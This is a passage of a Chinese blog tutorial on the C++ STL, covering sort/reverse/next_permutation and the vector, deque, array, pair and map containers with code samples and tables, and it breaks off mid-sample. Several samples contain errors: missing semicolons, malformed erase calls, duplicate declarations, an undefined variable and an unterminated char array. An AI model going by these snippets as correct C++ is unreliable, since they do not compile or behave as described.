class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span>  <span class="comment">// 使用Algorithm必须包含的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//排序</span></span><br><span class="line">  <span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>,<span class="number">7</span>&#125;;</span><br><span class="line">  <span class="built_in">sort</span> (a, a+<span class="number">5</span>); </span><br><span class="line">  <span class="comment">// stable_sort (a, a+5);</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    cout &lt;&lt; a[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 反转</span></span><br><span class="line">  <span class="built_in">reverse</span>(a, a+<span class="number">5</span>);  </span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    cout &lt;&lt; a[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 绝对值</span></span><br><span class="line">  cout &lt;&lt; <span class="built_in">abs</span>(<span class="number">-5</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 最大值最小值</span></span><br><span class="line">  cout &lt;&lt; <span class="built_in">max</span>(<span class="number">5</span>, <span class="number">3</span>) &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="built_in">min</span>(<span class="number">5</span>, <span class="number">3</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 交换</span></span><br><span class="line">  <span class="type">int</span> x = <span class="number">1</span>, y = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">swap</span> (x, y);</span><br><span class="line">  cout &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; y &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 赋值函数fill</span></span><br><span class="line">  <span class="type">int</span> b[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">  <span class="built_in">fill</span> (b, b+<span class="number">4</span>, <span class="number">-1</span>);   <span class="comment">//前4个元素全赋值为-1</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i ++)</span><br><span class="line">    cout &lt;&lt; b[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//求全排列的下一个顺序, next_permutation若有下一个全排列返回true没有则返回false</span></span><br><span class="line">  <span class="type">char</span> str[<span class="number">3</span>] = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">  &#125;<span class="keyword">while</span> (<span class="built_in">next_permutation</span>(str, str+<span class="number">3</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-Container"><a href="#2-Container" class="headerlink" title="2. Container"></a>2. Container</h2><h3 id="2-1-序列容器"><a href="#2-1-序列容器" class="headerlink" title="2.1 序列容器"></a><strong>2.1 序列容器</strong></h3><p>主要包括 vector 向量容器、list 列表容器以及 deque 双端队列容器。之所以被称为序列容器，是因为元素在容器中的位置同元素的值无关，即<strong>序列容器不是排序的</strong>。将元素插入容器时，指定在什么位置，元素就会位于什么位置。</p><h4 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h4><p>vector相比数组的好处是可以根据存储数据的数量自动变长，并且有很多方法可以直接调用。</p><p>vector容器<strong>在尾部增加或删除元素的效率最高</strong>（时间复杂度为 O(1) 常数阶），在其它位置插入或删除元素效率较差（时间复杂度为 O(n) 线性阶，其中 n 为容器中元素的个数）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// -----------------------初始化-----------------------</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; a; <span class="comment">//定义容器a，当前a长度为0，但和普通数组不同的是，此a可以根据存储数据的数量自动变长。</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; b &#123;&#125;;   <span class="comment">//指定为空</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">c</span><span class="params">(<span class="number">20</span>)</span></span>;  <span class="comment">//指定有20个元素，且全为0</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">d</span><span class="params">(<span class="number">20</span>, <span class="number">-1</span>)</span></span>;  <span class="comment">//指定有20个元素，且全为-1，这里可以使用变量进行初始化</span></span><br><span class="line">    <span class="comment">// 使用其他数据结构初始化</span></span><br><span class="line">    <span class="type">int</span> array[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; <span class="built_in">value</span>(array,array+<span class="number">3</span>);  <span class="comment">// 使用数组初始化vector</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; value1&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">value2</span><span class="params">(value1.begin(),value1.begin()+<span class="number">3</span>)</span></span>;   <span class="comment">// 使用vector初始化vector</span></span><br><span class="line">    value2.<span class="built_in">assign</span>(value1.<span class="built_in">begin</span>(),value1.<span class="built_in">begin</span>()+<span class="number">3</span>);    <span class="comment">//使用assign方法初始化</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -----------------------手动调整大小-----------------------</span></span><br><span class="line">    a.<span class="built_in">resize</span>(<span class="number">100</span>);  <span class="comment">// 默认初始化为0</span></span><br><span class="line">    a.<span class="built_in">resize</span>(<span class="number">20</span>, <span class="number">-1</span>) <span class="comment">//重新调整 a 的大小为 20，并存储 20 个 -1 元素。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 赋值</span></span><br><span class="line">    a[<span class="number">9</span>] = <span class="number">100</span>;</span><br><span class="line">    <span class="comment">// -----------------------添加元素-----------------------</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span> ; i++)&#123;  <span class="comment">//向a中添加10个元素</span></span><br><span class="line">        a.<span class="built_in">emplace_back</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    a.<span class="built_in">insert</span>(a.<span class="built_in">begin</span>(), <span class="number">100</span>， <span class="number">2</span>);  <span class="comment">//向指定位置的前面添加元素，2个100</span></span><br><span class="line">    a.<span class="built_in">emplace</span>(a.<span class="built_in">begin</span>(), <span class="number">100</span>);   <span class="comment">//emplace每次只能插入一个元素，但是emplace的效率更高</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -----------------------访问元素-----------------------</span></span><br><span class="line">    cout&lt;&lt;a[<span class="number">0</span>]&lt;&lt;endl;  <span class="comment">// 访问单个元素，直接使用下标，可能越界</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;首个元素为：&quot;</span> &lt;&lt; a.<span class="built_in">at</span>(<span class="number">0</span>) &lt;&lt; endl;   <span class="comment">// 使用at方法访问,会进行越界判断</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;values 首元素为：&quot;</span> &lt;&lt; values.<span class="built_in">front</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;values 尾元素为：&quot;</span> &lt;&lt; values.<span class="built_in">back</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> i = a.<span class="built_in">begin</span>(); i &lt; a.<span class="built_in">end</span>(); i++) &#123;  <span class="comment">//使用迭代器遍历容器</span></span><br><span class="line">        cout &lt;&lt; *i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -----------------------删除-----------------------</span></span><br><span class="line">    a.<span class="built_in">pop_back</span>();   <span class="comment">// 删除最后一个元素，size会减小，但capacity不会变</span></span><br><span class="line">    a,<span class="built_in">erase</span>(a.<span class="built_in">begin</span>(), a,begin+<span class="number">3</span>);  <span class="comment">// 删除指定位置的元素，并返回指向被删除元素下一个位置元素的迭代器，size会减小，但capacity不会变</span></span><br><span class="line">    <span class="keyword">auto</span> it = <span class="built_in">remove</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>(), <span class="number">3</span>);;  <span class="comment">// 删除等于指定值的元素，并返回指向被删除元素下一个位置元素的迭代器，，size和capacity都不会变</span></span><br><span class="line">    a.<span class="built_in">clear</span>();  <span class="comment">// 清空，size变为0，capacity不会变</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------交换元素-----------------------</span></span><br><span class="line"><span class="comment">// 注意，swap() 函数在头文件 &lt;algorithm&gt; 和 &lt;utility&gt; 中都有定义，使用时引入其中一个即可。</span></span><br><span class="line"><span class="built_in">swap</span>(*(a.<span class="built_in">begin</span>()+<span class="number">1</span>),*(a.<span class="built_in">end</span>()<span class="number">-1</span>));     <span class="comment">//等同于 swap(a[1],a[4])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><u>注意，vector 容器在使用resize()申请更多内存的同时，容器中的所有元素可能会被复制或移动到新的内存地址，这会导致之前创建的迭代器失效。</u>因此，为了保险起见，每当 vector 容器的容量发生变化时，我们都要对之前创建的迭代器重新初始化一遍：</p><p><u>注意，不要使用vector&lt;bool&gt;，该类型使用bit进行存储，会有很多问题</u></p><p> <strong>array、vector 和 deque 容器的函数成员:</strong></p><table><thead><tr><th>函数成员</th><th>函数功能</th><th>array</th><th>vector</th><th>deque</th></tr></thead><tbody><tr><td>begin()</td><td>返回指向容器中第一个元素的迭代器。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>end()</td><td>返回指向容器最后一个元素所在位置后一个位置的迭代器，通常和 begin() 结合使用。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>rbegin()</td><td>返回指向最后一个元素的迭代器。且++是向左移动</td><td>是</td><td>是</td><td>是</td></tr><tr><td>rend()</td><td>返回指向第一个元素所在位置前一个位置的迭代器。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>assign()</td><td>用新元素替换原有内容。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>size()</td><td>返回实际元素个数。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>empty()</td><td>判断容器中是否有元素，若无元素，则返回 true；反之，返回 false。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>at()</td><td>使用经过边界检查的索引访问元素。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>resize()</td><td>改变实际元素的个数。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>front()</td><td>返回第一个元素的引用。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>back()</td><td>返回最后一个元素的引用。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>operator[]</td><td>使用索引访问元素。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>push_back()</td><td>在序列的尾部添加一个元素。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>insert()</td><td>在指定的位置插入一个或多个元素。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>emplace_back()</td><td>在序列尾部生成一个元素。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>pop_back()</td><td>移出序列尾部的元素。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>erase()</td><td>移出一个元素或一段元素。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>clear()</td><td>移出所有的元素，容器大小变为 0。</td><td>-</td><td>是</td><td>是</td></tr><tr><td>swap()</td><td>交换两个容器的所有元素。</td><td>是</td><td>是</td><td>是</td></tr><tr><td>data()</td><td>返回指向容器中第一个元素的指针。</td><td>是</td><td>是</td><td>-</td></tr></tbody></table><h4 id="list"><a href="#list" class="headerlink" title="list"></a>list</h4><p>list容器以<strong>双向链表</strong>的形式组织元素，在这个序列的<strong>任何地方都可以高效地增加或删除元素</strong>（时间复杂度都为常数阶 O(1)），但访问容器中任意元素的<strong>速度要比前三种容器慢</strong>，这是因为 list&lt;T&gt; 必须从第一个元素或最后一个元素开始访问，需要沿着链表移动，直到到达想要的元素。</p><p>另外还有一个forward_list&lt;T&gt;（正向链表容器），和 list 容器非常类似，只不过它以单链表的形式组织元素，它内部的元素只能从第一个元素开始访问，是一类比链表容器快、更节省内存的容器。</p><h4 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h4><p>deque容器不仅尾部插入和删除元素高效，在头部插入或删除元素也同样高效，时间复杂度都是 O(1) 常数阶，但是在容器中某一位置处插入或删除元素，时间复杂度为 O(n) 线性阶；</p><p>相比vector，deque可以更方便的在头部增删元素。</p><p><strong>deque容器提供的成员函数：</strong>其余未展示的函数基本与vector相同</p><table><thead><tr><th>函数成员</th><th>函数功能</th></tr></thead><tbody><tr><td>push_back()</td><td>在序列的尾部添加一个元素。</td></tr><tr><td>push_front()</td><td>在序列的头部添加一个元素。</td></tr><tr><td>emplace_front()</td><td>在容器头部生成一个元素。和 push_front() 的区别是，该函数直接在容器头部构造元素，省去了复制移动元素的过程。</td></tr><tr><td>emplace_back()</td><td>在容器尾部生成一个元素。和 push_back() 的区别是，该函数直接在容器尾部构造元素，省去了复制移动元素的过程。</td></tr><tr><td>pop_back()</td><td>移除容器尾部的元素。</td></tr><tr><td>pop_front()</td><td>移除容器头部的元素。</td></tr></tbody></table><h4 id="array"><a href="#array" class="headerlink" title="array"></a>array</h4><p>array&lt;T,N&gt;（数组容器）：表示可以存储 N 个 T 类型的元素，是 C++ 本身提供的一种容器。此类容器一旦建立，其<strong>长度就是固定不变的</strong>，这意味着不能增加或删除元素，只能改变某个元素的值；</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    std::array&lt;<span class="type">double</span>, 10&gt; v;  <span class="comment">// 名为v的有10个double类型的元素的array</span></span><br><span class="line">    std::array&lt;<span class="type">double</span>, 10&gt; v &#123;&#125;;   <span class="comment">// 初始化全为0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><u>除此之外，stack&lt;T&gt; 和 queue&lt;T&gt; 本质上也属于序列容器，只不过它们都是在 deque 容器的基础上改头换面而成，通常更习惯称它们为容器适配器</u></p><h3 id="2-2-排序容器"><a href="#2-2-排序容器" class="headerlink" title="2.2 排序容器"></a>2.2 排序容器</h3><p>包括 set 集合容器、multiset多重集合容器、map映射容器以及 multimap 多重映射容器。排序容器中的元素默认是由小到大排序好的，即便是插入元素，元素也会插入到适当位置。所以关联容器在查找时具有非常好的性能。multimap、multiset与map、set的唯一不同在于其键可以重复。</p><p>STL中可以使用 pair 类模板来创建“键值对”形式的元素。pair类模板还提供有一个 swap() 成员函数，能够互换 2 个 pair 对象的键值对，其操作成功的前提是这 2 个 pair 对象的键和值的类型要相同。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span>      <span class="comment">// pair 类模板定义在&lt;utility&gt;头文件中</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用默认构造函数</span></span><br><span class="line">    pair&lt;string, string&gt; pair1;</span><br><span class="line">    pair1.first = <span class="string">&quot;animal&quot;</span>;</span><br><span class="line">    pair1.second = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">    <span class="comment">// 直接使用 2 个元素初始化 pair 对象</span></span><br><span class="line">    <span class="function">pair&lt;string, string&gt; <span class="title">pair2</span><span class="params">(<span class="string">&quot;animal&quot;</span>,<span class="string">&quot;cat&quot;</span>)</span></span>;</span><br><span class="line">    pair&lt;string, string&gt; pair2 = &#123;<span class="string">&quot;animal&quot;</span>,<span class="string">&quot;cat&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// 使用pair初始化pair</span></span><br><span class="line">    <span class="function">pair&lt;string, string&gt; <span class="title">pair3</span><span class="params">(pair2)</span></span>;</span><br><span class="line">    <span class="comment">// 调用移动构造函数</span></span><br><span class="line">    <span class="function">pair&lt;string, string&gt; <span class="title">pair4</span><span class="params">(make_pair(<span class="string">&quot;animal&quot;</span>, <span class="string">&quot;cat&quot;</span>))</span></span>;</span><br><span class="line">pair&lt;string, string&gt; pair4 = <span class="built_in">make_pair</span>(<span class="string">&quot;animal&quot;</span>, <span class="string">&quot;cat&quot;</span>);</span><br><span class="line">    <span class="comment">// 输出</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;pair1: &quot;</span> &lt;&lt; pair1.first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; pair1.second &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 交换键值对</span></span><br><span class="line">    pair1.<span class="built_in">swap</span>(pair2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>定义在 &lt;map&gt; 头文件中，使用该容器存储的数据，其各个元素的键必须是唯一的（即不能重复），该容器会根据各元素键的大小，默认进行升序排序。</p><p><u>注意，使用insert函数插入元素val时</u>，val 参数表示键值对变量，同时该方法会返回一个 pair 对象，其中 pair.first 表示一个迭代器，pair.second 为一个 bool 类型变量：</p><ul><li>如果成功插入 val，则该迭代器指向新插入的 val，bool 值为 true；</li><li>如果插入 val 失败，则表明当前 map 容器中存有和 val 的键相同的键值对（用 p 表示），此时返回的迭代器指向 p，bool 值为 false</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span>   <span class="comment">//使用 map 容器，必须引入该头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;utility&gt;</span>  <span class="comment">// 使用pair</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// -------------------------初始化-------------------------</span></span><br><span class="line">    <span class="comment">//创建一个空的 map 关联式容器，该容器中存储的键值对，其中键为 string 字符串，值也为 string 字符串类型</span></span><br><span class="line">    map&lt;string, string&gt; mymap;</span><br><span class="line">    <span class="comment">//向 mymap 容器中添加数据</span></span><br><span class="line">    mymap[<span class="string">&quot;animal&quot;</span>] = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">    mymap[<span class="string">&quot;plant&quot;</span>] = <span class="string">&quot;flower&quot;</span>;</span><br><span class="line">    mymap[<span class="string">&quot;planet&quot;</span>] = <span class="string">&quot;earth&quot;</span>;</span><br><span class="line">    <span class="comment">// 定义的同时初始化</span></span><br><span class="line">    map&lt;string, <span class="type">int</span>&gt; myMap&#123; &#123;<span class="string">&quot;animal&quot;</span>,<span class="number">10</span>&#125;,&#123;<span class="string">&quot;plant&quot;</span>,<span class="number">20</span>&#125; &#125;;</span><br><span class="line">    map&lt;string, <span class="type">int</span>&gt; myMap&#123; <span class="built_in">make_pair</span>(<span class="string">&quot;animal&quot;</span>,<span class="number">10</span>), <span class="built_in">make_pair</span>(<span class="string">&quot;plant&quot;</span>,<span class="number">20</span>) &#125;;</span><br><span class="line">    <span class="function">map&lt;string, <span class="type">int</span>&gt; <span class="title">newMap</span><span class="params">(myMap)</span></span></span><br><span class="line"><span class="function">    <span class="comment">// map默认使用升序排序初始化，所以下面两行代码等价</span></span></span><br><span class="line"><span class="function">    map&lt;string, <span class="type">int</span>, less&lt;string&gt;&gt; myMap</span>&#123; &#123;<span class="string">&quot;C语言教程&quot;</span>,<span class="number">10</span>&#125;,&#123;<span class="string">&quot;STL教程&quot;</span>,<span class="number">20</span>&#125; &#125;;</span><br><span class="line">    map&lt;string, <span class="type">int</span> &gt;myMap&#123; &#123;<span class="string">&quot;C语言教程&quot;</span>,<span class="number">10</span>&#125;,&#123;<span class="string">&quot;STL教程&quot;</span>,<span class="number">20</span>&#125; &#125;;</span><br><span class="line">    <span class="comment">// map使用降序排序初始化</span></span><br><span class="line">    map&lt;string, <span class="type">int</span>, greater&lt;string&gt;&gt;myMap&#123; &#123;<span class="string">&quot;C语言教程&quot;</span>,<span class="number">10</span>&#125;,&#123;<span class="string">&quot;STL教程&quot;</span>,<span class="number">20</span>&#125; &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -------------------------添加键值对-------------------------</span></span><br><span class="line">    myMap.<span class="built_in">emplace</span>(<span class="string">&quot;planet&quot;</span>,<span class="string">&quot;earth&quot;</span>);</span><br><span class="line">    <span class="function">pair&lt;string, string&gt; <span class="title">a</span><span class="params">(<span class="string">&quot;planet&quot;</span>,<span class="string">&quot;earth&quot;</span>)</span></span>;</span><br><span class="line">    myMap.<span class="built_in">insert</span>(a);   <span class="comment">// 因为map会自动根据键进行排序，所以插入时没有必要指定插入位置</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -------------------------遍历和索引-------------------------</span></span><br><span class="line">    <span class="comment">//使用 map 容器的迭代器，遍历 mymap 容器，并输出其中存储的各个键值对</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> it = mymap.<span class="built_in">begin</span>(); it != mymap.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">        <span class="comment">//输出各个元素中的键和值</span></span><br><span class="line">        cout &lt;&lt; it-&gt;first &lt;&lt; <span class="string">&quot; =&gt; &quot;</span> &lt;&lt; it-&gt;second &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    string a = mymap[<span class="string">&quot;animal&quot;</span>];</span><br><span class="line">    string a = myMap.<span class="built_in">at</span>(<span class="string">&quot;animal&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// -------------------------查找-------------------------</span></span><br><span class="line">    <span class="keyword">auto</span> iter = myMap.<span class="built_in">find</span>(<span class="string">&quot;animal&quot;</span>);   <span class="comment">//查找键为 &quot;animal&quot; 的键值对</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//找到第一个键的值大于或等于 &quot;animal&quot; 的键值对</span></span><br><span class="line">    <span class="keyword">auto</span> iter = myMap.<span class="built_in">lower_bound</span>(<span class="string">&quot;animal&quot;</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;lower：&quot;</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; endl;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//找到第一个键的值大于 &quot;animal&quot; 的键值对</span></span><br><span class="line">    iter = myMap.<span class="built_in">upper_bound</span>(<span class="string">&quot;animal&quot;</span>);</span><br><span class="line">    cout &lt;&lt;<span class="string">&quot;upper：&quot;</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 找到值与 &quot;animal&quot; 的值相等的键值对</span></span><br><span class="line">    <span class="keyword">auto</span> myPair = myMap.<span class="built_in">equal_range</span>(<span class="string">&quot;animal&quot;</span>);  <span class="comment">// equal_range返回一个pair,第一个元素为lower_bound的返回值，第二个元素为upper_bound的返回值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> iter = myPair.first; iter != myPair.second; ++iter) &#123;</span><br><span class="line">        cout &lt;&lt; iter-&gt;first &lt;&lt; <span 